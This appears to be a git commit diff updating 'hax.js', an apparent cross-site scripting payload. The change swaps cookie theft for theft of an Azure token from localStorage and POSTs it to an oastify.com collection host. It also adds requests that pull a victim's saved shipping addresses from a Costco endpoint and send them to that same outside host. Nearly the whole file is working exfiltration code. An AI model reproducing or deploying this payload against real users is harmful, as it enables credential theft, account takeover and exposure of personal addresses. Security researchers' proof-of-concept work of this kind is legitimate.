1b799620cb29c3cc0ca45cdb86086da79ab595d2
Jay3shh <jayesh921@gmail.com>
2023-08-25 05:20:49 +0530

    Update hax.js

--- hax.js
+++ hax.js
@@ -1,4 +1,4 @@
-var victimCookies=document.cookie
+var victimAzureToken=localStorage.getItem('azure_token');
 var xhr = new XMLHttpRequest();
 xhr.open("POST", "https://7ltaq649b33zwlkr5ngy29idr4xvlm9b.oastify.com", true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
@@ -13,6 +13,48 @@ xhr.onreadystatechange = function() {
     // Handle any errors that occur during the request
   }
 };
-
-var requestBody = "cookies=" + victimCookies;
+var requestBody = "cookies=" + victimAzureToken;
 xhr.send(requestBody);
+
+
+var victimAddress;
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://www.costco.com/AjaxCostcoGetAddressCmd?requesttype=ajax&addressType=S&filterName=ALL&filterOrder=RECENT&start=1&end=100000", true);
+
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4 && xhr.status === 200) {
+    var response = xhr.responseText;
+    victimAddress = response
+    console.log(response);
+    // Process the response data here
+  } else if (xhr.readyState === 4) {
+    console.log('Request failed with status code:', xhr.status);
+    // Handle any errors that occur during the request
+  }
+};
+
+xhr.send(requestBody);
+
+var reqBody = victimAddress;
+
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://7ltaq649b33zwlkr5ngy29idr4xvlm9b.oastify.com", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4 && xhr.status === 200) {
+    var response = xhr.responseText;
+    console.log(response);
+    // Process the response data here
+  } else if (xhr.readyState === 4) {
+    console.log('Request failed with status code:', xhr.status);
+    // Handle any errors that occur during the request
+  }
+};
+var requestBody = reqBody;
+xhr.send(requestBody);
+
+
+
+
+  
